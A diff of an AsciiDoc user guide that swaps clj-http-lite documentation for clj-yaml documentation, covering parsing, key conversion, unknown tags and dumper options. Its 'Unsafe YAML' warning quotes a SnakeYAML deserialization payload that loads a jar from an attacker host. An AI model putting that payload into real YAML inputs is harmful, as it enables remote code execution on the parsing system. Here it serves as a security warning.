@@ -2,350 +2,309 @@
 :toclevels: 5
 :toc:
 // DO NOT EDIT: the lib-version parameter is automatically updated by bb publish
-:lib-version: 1.4.2
+:lib-version: 0.7.169
+
+== Audience
+You want to learn more about how to use the clj-yaml library from your app, library or script.
 
 == Introduction
-Clj-http-lite is a Clojure, Babashka and GraalVM compatible liteweight subset of http://github.com/dakrone/clj-http[clj-http].
 
-=== Differences from clj-http
-
-* Instead of Apache HttpClient, clj-http-lite uses HttpURLConnection
-* No automatic JSON decoding for response bodies
-* No automatic request body encoding beyond charset and url encoding of form params
-* No cookie support
-* No multipart form uploads
-* No persistent connection support
-* Fewer options
-* namespace rename `clj-http.*` -> `clj-http.lite.*`
-
-Like its namesake, clj-http-lite is light and simple, but ping us if there is some clj-http feature you’d like to see in clj-http-lite.
-We can discuss.
-
-=== Supported Environments [[supported-envs]]
-
-* JDK 8, 11, 17
-* Clojure 1.8 runtime and above
-* Babashka current release
-* Windows, Linux, macOS
+Clj-yaml is a Clojure wrapper over https://bitbucket.org/snakeyaml/snakeyaml/src/master/[SnakeYAML].
 
 === History
 
-* Sep 2011 - https://github.com/dakrone/clj-http[dakrone/clj-http] created (and is still actively maintained)
-* Feb 2012 - https://github.com/hiredman/clj-http-lite[hiredman/clj-http-lite] (now archived) forked from `dakrone/clj-http` to use Java’s HttpURLConnection instead of Apache HttpClient.
-* Jul 2018 - `martinklepsch/clj-http-lite` forked from `hiredman/clj-http-lite` for new development and maintenance
-* Nov 2021 - Martin transfered his fork to `clj-commons/clj-http-lite` so it could get the ongoing love it needs from the Clojure community
-
-=== Interesting Alternatives
-
-Maybe clj-http-lite is not your cup of tea? Some alternatives to explore:
-
-Clojure based:
-
-* http://github.com/dakrone/clj-http[clj-http] - heavier than clj-http-lite, but has many more features
-
-Babashka compatible:
-
-* https://github.com/schmee/java-http-clj[java-http-clj] - Clojure wrapper for java.net.http with async, HTTP/2 and WebSockets
-* https://github.com/http-kit/http-kit[http-kit] - minimalist, event-driven, high-performance Clojure HTTP server/client library with WebSocket and asynchronous support
-* https://github.com/gnarroway/hato[hato] - An HTTP client for Clojure, wrapping JDK 11's HttpClient
-* https://github.com/babashka/babashka.curl[babashka.curl] - A tiny curl wrapper via idiomatic Clojure, inspired by clj-http, Ring and friends
+- Feb 2010 - https://github.com/lancepantz/clj-yaml[lancepantz/clj-yaml] is created
+- Dec 2013 - https://github.com/CircleCI-Archived/clj-yaml[circleci/clj-yaml] picks up the torch
+- Jan 2019 - clj-commons adopts clj-yaml where it can get the ongoing love and care that it needs
 
 == Installation
 
-Clojure cli users, add the following under `:deps` in your `deps.edn` file. +
-Babashka users, add the following under `:deps` in your `bb.edn` file:
-[source,clojure,subs="attributes+"]
-----
-    org.clj-commons/clj-http-lite {:mvn/version "{lib-version}"}
-----
+=== Babashka
 
-Lein users, add the following into the `:dependencies` vector in your `project.clj` file:
+No installation required.
+Clj-yaml is built into babashka.
+
+=== Leiningen/Boot
 
 [source,clojure,subs="attributes+"]
 ----
-    [org.clj-commons/clj-http-lite "{lib-version}"]
+[clj-commons/clj-yaml "{lib-version}"]
 ----
+
+=== Clojure CLI/`deps.edn`
+
+[source,clojure,subs="attributes+"]
+----
+clj-commons/clj-yaml {:mvn/version "{lib-version}"}
+----
+
+=== As Git Dependency
+
+To get the latest changes that are not yet released to Clojars, you can use this library as a git dependency:
+
+[source,clojure]
+----
+$ cat deps.edn
+{:deps {clj-commons/clj-yaml {:git/url "https://github.com/clj-commons/clj-yaml"
+                              :git/sha "05eaca35c34c092ffdd2e620ef07962ce147a88b"}}}
+
+$ clj -X:deps prep
+$ clj -M -e "(require '[clj-yaml.core :as yaml])"
+----
+
+Replace the `:git/sha` value as appropriate.
 
 == Usage
 
-=== General
-HTTP client functionality is provided by the `clj-http.lite.client` namespace:
+=== Internal vs Public API
+
+When the clj-commons/clj-yaml team adopted clj-yaml it made some assumptions about the clj-yaml public API.
+It turns out folks are using more of clj-yaml than we originally expected.
+
+We encourage you to stick to the higher level functions as documented in the `clj-yaml.core` namespace.
+
+If you do find yourself needing to use the lower level functions, please let us know.
+Perhaps you are doing so to overcome a limitation in clj-yaml that we could address to everyone's benefit.
+
+Note that:
+
+* babashka only exposes the higher level functions.
+* this user guide only describes and promotes usage of higher level functions
+
+=== Quick Start
 
 [source,clojure]
 ----
-(require '[clj-http.lite.client :as client])
+(require '[clj-yaml.core :as yaml])
+
+(yaml/generate-string
+  [{:name "John Smith", :age 33}
+   {:name "Mary Smith", :age 27}])
+;; => "- {name: John Smith, age: 33}\n- {name: Mary Smith, age: 27}\n"
+
+(yaml/parse-string "
+- {name: John Smith, age: 33}
+- name: Mary Smith
+  age: 27
+")
+;; => ({:name "John Smith", :age 33}
+;;     {:name "Mary Smith", :age 27})
 ----
 
-The client supports simple `get`, `head`, `put`, `post`, and `delete` requests.
-They all return Ring-style response maps:
+=== Parsing YAML
+
+[[key-conv]]
+==== Key Conversion
+
+By default, YAML keys are converted to Clojure keywords. To prevent this, include the `:keywords false` option when calling `parse-string` or `parse-stream` functions:
 
 [source,clojure]
 ----
-(client/get "https://google.com")
-=> {:status 200
-    :headers {"date" "Wed, 17 Aug 2022 21:37:58 GMT"
-              "cache-control" "private, max-age=0"
-              "content-type" "text/html; charset=ISO-8859-1"
-              ...}
-    :body "<!doctype html>..."}
+(yaml/parse-string "
+- {name: John Smith}
+" :keywords false)
+;; => ({"name" "John Smith"})
 ----
 
-TIP: We encourage you to try out these examples in your REPL, `httpbin.org` is a free HTTP test playground and used in many of our examples.
+The `:keywords` option defaults to `true` for historical reasons.
+When clj-yaml detects a key that cannot be converted to a Clojure keyword, it will leave it unconverted.
+Detection and conversion is not sophisticated and can result in keywords that are illegal and unreadable.
+
+For this reason we added the `:key-fn` option.
+This allows you to take control and do whatever conversion makes sense for your YAML key inputs.
+
+You can use `:key-fn` to do something similar to `:keywords true`:
 
 [source,clojure]
 ----
-(client/get "https://httpbin.org/user-agent")
-
-;; Tell the server you'd like a json response
-(client/get "https://httpbin.org/user-agent" {:accept :json})
-
-;; Or maybe you'd like html back
-(client/get "https://httpbin.org/html" {:accept "text/html"})
-
-;; Various options
-(client/post "https://httpbin.org/anything"
-  {:basic-auth ["joe" "cool"]
-   :body "{\"json\": \"input\"}"
-   :headers {"X-Api-Version" "2"}
-   :content-type :json
-   :socket-timeout 1000
-   :conn-timeout 1000
-   :accept :json})
-
-;; Need to contact a server with an untrusted SSL cert?
-(client/get "https://expired.badssl.com" {:insecure? true})
-
-;; By default we automatically follow 30* redirects...
-(client/get "https://httpbin.org/redirect-to?url=https%3A%2F%2Fclojure.org")
-
-;; ... but you don't have to
-(client/get "https://httpbin.org/redirect-to?url=https%3A%2F%2Fclojure.org"
-            {:follow-redirects false})
-
-;; Send form params as a urlencoded body
-(client/post "https://httpbin.org/post" {:form-params {:foo "bar"}})
-
-;; Basic authentication
-(client/get "https://joe:cool@httpbin.org/basic-auth/joe/cool")
-(client/get "https://httpbin.org/basic-auth/joe/cool" {:basic-auth ["joe" "cool"]})
-(client/get "https://httpbin.org/basic-auth/joe/cool" {:basic-auth "joe:cool"})
-
-;; Query parameters can be specified as a map
-(client/get "https://httpbin.org/get" {:query-params {"q" "foo, bar"}})
+(yaml/parse-string "
+- {name: John Smith}
+" :key-fn #(-> % :key keyword))
+;; => ({:name "John Smith"})
 ----
 
-The client transparently accepts and decompresses the `gzip` and `deflate` content encodings.
+Or, something entirely different:
 
 [source,clojure]
 ----
-(client/get "https://httpbin.org/gzip")
+(require '[clojure.string :as string])
 
-(client/get "https://httpbin.org/deflate")
+(yaml/parse-string "
+- {name: John Smith}
+" :key-fn #(-> % :key string/upper-case string/reverse))
+;; => ({"EMAN" "John Smith"})
 ----
 
-=== Nested params
 
-Nested parameter `{:a {:b 1}}` in `:form-params` or `:query-params` is automatically flattened to `a[b]=1`.
+==== Unknown tags [[unknown-tags]]
+Unknown tags can be handled by passing a handler function via the `:unknown-tag-fn` option.
+The handler function is provided a map which includes `:tag` and `:value` keys.
+Note that the value passed to the `unknown-tag-fn` is a string if it's a scalar, regardless of the quoting (or lack thereof) of the scalar value.
 
 [source,clojure]
 ----
-(-> (client/get "https://httpbin.org/get"
-                {:query-params {:one {:two 2 :three 3}}})
-    :body
-    println)
-{
-  "args": {
-    "one[three]": "3",
-    "one[two]": "2"
-  },
-  ...
-}
+;; drop unknown tags
+(yaml/parse-string "!Base12 10" :unknown-tag-fn :value
+;; => "10"
 
-(-> (client/post "https://httpbin.org/post"
-                 {:form-params {:one {:two 2
-                                      :three {:four {:five 5}}}
-                                :six 6}})
-    :body
-    println)
-{
-  ...
-  "form": {
-    "one[three][four][five]": "5",
-    "one[two]": "2",
-    "six": "6"
-  },
-  ...
-}
+;; or do some smart convertion
+(yaml/parse-string "!Base12 10"
+                   :unknown-tag-fn (fn [{:keys [tag value]}]
+                                      (if (= "!Base12" tag)
+                                          (Integer/parseInt value 12)
+                                          value)))
+;; => 12
 ----
 
-=== Request body coercion
+==== Unsafe YAML [[unsafe]]
+Clj-yaml optionally supports the creation of Java classes.
+This is considered unsafe.
+
+IMPORTANT: Be very wary of specifying `:unsafe true` unless you completely trust your YAML inputs.
+Consider instead using `:unknown-tag-fn` for fine and deliberate control.
+
+An example of some malicious YAML is https://j0vsec.com/post/cve-2021-25738/[well described by J0VSEC].
+Here's the dangerous snippit described:
+
+[source, yaml]
+----
+some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]
+----
+
+Also security related are `:allow-recursive-keys` and `:max-aliases-for-collections` options.
+
+==== Positional Data [[mark]]
+You can ask clj-yaml to return parsed YAML with extra positional data markers via the `:mark true` option.
 
 [source,clojure]
 ----
-;; body as byte-array
-(client/post "https://httbin.org/post" {:body (.getBytes "testing123")})
-
-;; body from a string
-(client/post "https://httpbin.org/post" {:body "testing456"})
-
-;; string :body-encoding is optional and defaults to "UTF-8"
-(client/post "https://httpbin.org/post"
-             {:body "mystring" :body-encoding "UTF-8"})
-
-;; body from a file
-(require '[clojure.java.io :as io])
-(spit "clj-http-lite-test.txt" "from a file")
-(client/post "https://httpbin.org/post"
-             {:body (io/file "clj-http-lite-test.txt")
-              :body-encoding "UTF-8"})
-
-;; from a stream
-(with-open [is (io/input-stream "clj-http-lite-test.txt")]
-  (client/post "https://httpbin.org/post"
-               {:body (io/input-stream "clj-http-lite-test.txt")})  )
+(yaml/parse-string "
+- name: Mary Smith
+  age: 27
+" :mark true)
+;; => {:start {:line 1, :index 1, :column 0},
+;;     :end {:line 3, :index 30, :column 0},
+;;     :unmark
+;;     ({:start {:line 1, :index 3, :column 2},
+;;       :end {:line 3, :index 30, :column 0},
+;;       :unmark
+;;       {{:start {:line 1, :index 3, :column 2},
+;;         :end {:line 1, :index 7, :column 6},
+;;         :unmark "name"}
+;;        {:start {:line 1, :index 9, :column 8},
+;;         :end {:line 1, :index 19, :column 18},
+;;         :unmark "Mary Smith"},
+;;        {:start {:line 2, :index 22, :column 2},
+;;         :end {:line 2, :index 25, :column 5},
+;;         :unmark "age"}
+;;        {:start {:line 2, :index 27, :column 7},
+;;         :end {:line 2, :index 29, :column 9},
+;;         :unmark 27}}})}
 ----
 
-=== Output body coercion
+In reality, the `:start` `:end` and `:unmark` maps are internally a record and can be recognized via `marked?` and unwrapped via `unmark`.
+
+=== Generating YAML
+
+==== Dumper Options [[dumper-options]]
+Different flow styles (`:auto`, `:block`, `:flow`) allow customization of how YAML is rendered.
+
+To demonstrate let's setup `some-data` to play with.
 
 [source,clojure]
 ----
-;; The default response body is a string body
-(client/get "https://clojure.org")
+(def some-yaml "
+todo:
+  - name: Fix issue
+    responsible:
+      name: Rita
+")
 
-;; Coerce to a byte-array
-(client/get "http://clojure.org" {:as :byte-array})
-
-;; Coerce to a string with using a specific charset, default is UTF-8
-(client/get "http://clojure.org" {:as "US-ASCII"})
-
-;; Try to automatically coerce the body based on the content-type
-;; response header charset
-(client/get "https://google.com" {:as :auto})
-
-;; Return the body as a stream
-;; Note that the connection to the server will NOT be closed until the
-;; stream has been read
-(let [res (client/get "https://clojure.org" {:as :stream})]
-  (with-open [body-stream (:body res)]
-    (slurp body-stream)))
+(def some-data (yaml/parse-string some-yaml))
 ----
 
-A more general `request` function is also available, which is useful as a primitive for building higher-level interfaces:
+To select the `:block` flow style:
+[source,clojure]
+----
+(yaml/generate-string some-data :dumper-options {:flow-style :block})
+----
+
+results in a string of YAML, that when printed:
+[source,yaml]
+----
+todo:
+- name: Fix issue
+  responsible:
+    name: Rita
+----
+
+The same but with the `:flow` style results in:
+[source,yaml]
+----
+{todo: [{name: Fix issue, responsible: {name: Rita}}]}
+----
+
+And finally the `:auto` style (the default) renders:
+[source,yaml]
+----
+todo:
+- name: Fix issue
+  responsible: {name: Rita}
+----
+
+Use the `:indent` and `:indicator-indent` options to adjust indentation:
 
 [source,clojure]
 ----
-(defn api-action [method path & [opts]]
-  (client/request
-    (merge {:method method :url (str "https://some.api/" path)} opts)))
+(yaml/generate-string some-data :dumper-options {:indent 6
+                                                 :indicator-indent 3
+                                                 :flow-style :block})
 ----
 
-=== Exceptions
+results in:
+[source,yaml]
+----
+todo:
+   -  name: Fix issue
+      responsible:
+            name: Rita
+----
 
-When a server returns an exceptional HTTP status code, by default, clj-http-lite throws an `ex-info` exception.
-The response is included as `ex-data`.
+`:indent` must always be larger than `:indicator-indent`.
+If it is only 1 higher, the indicator will be on a separate line:
 
 [source,clojure]
 ----
-(client/get "https://httpbin.org/404")
-;; => ExceptionInfo clj-http: status 404  clojure.core/ex-info (core.clj:4617)
-
-(-> *e ex-data :status)
-;; => 404
-
-(-> *e ex-data keys)
-;; => (:headers :status :body)
+(yaml/generate-string some-data :dumper-options {:indent 2
+                                                 :indicator-indent 1
+                                                 :flow-style :block})
+----
+results in:
+[source,yaml]
+----
+todo:
+ -
+  name: Fix issue
+  responsible:
+    name: Rita
 ----
 
-You can suppress HTTP status exceptions and handle them yourself via the `:throw-exceptions` option:
+[[keyword-args]]
+=== Function Options as Keyword Args
+
+You'll notice that clj-yaml functions use keyword args for options.
+
+Clojure 1.11 allows these types of functions to instead be called with a map for the options:
 
 [source,clojure]
 ----
-(client/get "https://httpbin.org/404" {:throw-exceptions false})
+;; old school
+(yaml/parse-string "ok: 42" :keywords false)
+;; => {"ok" 42}
+
+;; clojure 1.11 also allows:
+(yaml/parse-string "ok: 42" {:keywords false})
+;; => {"ok" 42}
 ----
 
-You can choose to ignore an unknown host via `:ingore-unknown-host?` option.
-When enabled, requests return `nil` if the host is not found.
-
-[source,clojure]
-----
-(client/get "http://aoeuntahuf89o.com" {:ignore-unknown-host? true})
-;; => nil
-----
-
-=== Proxies
-
-A proxy can be specified by setting the Java properties: `<scheme>.proxyHost` and `<scheme>.proxyPort` where `<scheme>` is the client scheme used (normally `http' or `https').
-
-== Mocking clj-http-lite responses
-
-Mocking responses from the clj-http-lite client in tests is easily accomplished with e.g. `with-redefs`:
-
-[source,clojure]
-----
-(defn my-http-function []
-  (let [response (client/get "https://example.org")]
-    (when (= 200 (:status response))
-      (:body response))))
-
-(deftest my-http-function-test
-  (with-redefs [client/get (fn [_] {:status 200 :headers {"content-type" "text/plain"} :body "OK"})]
-    (is (= (my-http-function) "OK"))))
-----
-
-More advanced mocking may be performed by matching attributes in the `request`, like the `mock-response` function below.
-
-[source,clojure]
-----
-(ns http-test
-  (:require [clojure.data.json :as json]
-            [clojure.test :refer [deftest is testing]]
-            [clj-http.lite.client :as client]))
-
-(defn send-report [data]
-  (:body (client/post "https://example.com/reports" {:body data})))
-
-(defn get-users []
-  (json/read-str (:body (client/get "https://example.com/users"))))
-
-(defn get-admin []
-  (let [response (client/get "https://example.com/admin")]
-    (if (= 200 (:status response))
-      (:body response)
-      "403 Forbidden")))
-
-(defn mock-response [{:keys [url method body] :as request}]
-  (condp = [url method]
-    ["https://example.com/reports" :post]
-    {:status  201 :headers {"content-type" "text/plain"} :body (str "created: " body)}
-
-    ["https://example.com/users" :get]
-    {:status 200 :headers {"content-type" "application/json"} :body (json/write-str ["joe" "jane" "bob"])}
-
-    ["https://example.com/admin" :get]
-    {:status 403 :headers {"content-type" "text/plain"} :body "forbidden"}
-
-    (throw (ex-info "unexpected request" request))))
-
-(deftest send-report-test
-  (with-redefs [client/request mock-response]
-    (testing "sending report"
-      (is (= (send-report {:balance 100}) "created: {:balance 100}")))
-    (testing "list users"
-      (is (= (get-users) ["joe" "jane" "bob"])))
-    (testing "access admin page"
-      (is (= (get-admin) "403 Forbidden")))))
-----
-
-== GraalVM Native Image Tips
-
-You’ll need to enable url protocols when building your native image.
-
-See https://www.graalvm.org/22.2/reference-manual/native-image/dynamic-features/URLProtocols/[GraalVM docs].
-
-== Design
-
-The design of `clj-http` (and therefore `clj-http-lite`) is inspired by the https://github.com/ring-clojure/ring[Ring] protocol for Clojure HTTP server applications.
-
-The client in `clj-http.lite.core` makes HTTP requests according to a given Ring request map and returns Ring response maps corresponding to the resulting HTTP response.
-The function `clj-http.lite.client/request` uses Ring-style middleware to layer functionality over the core HTTP request/response implementation.
-Methods like `clj-http.lite.client/get` are sugar over this `clj-http.lite.client/request` function.
+TIP: If you are using a version of Clojure before v1.11, or you want to stay compatible with older versions of Clojure, you'll need to call these functions the old school way.
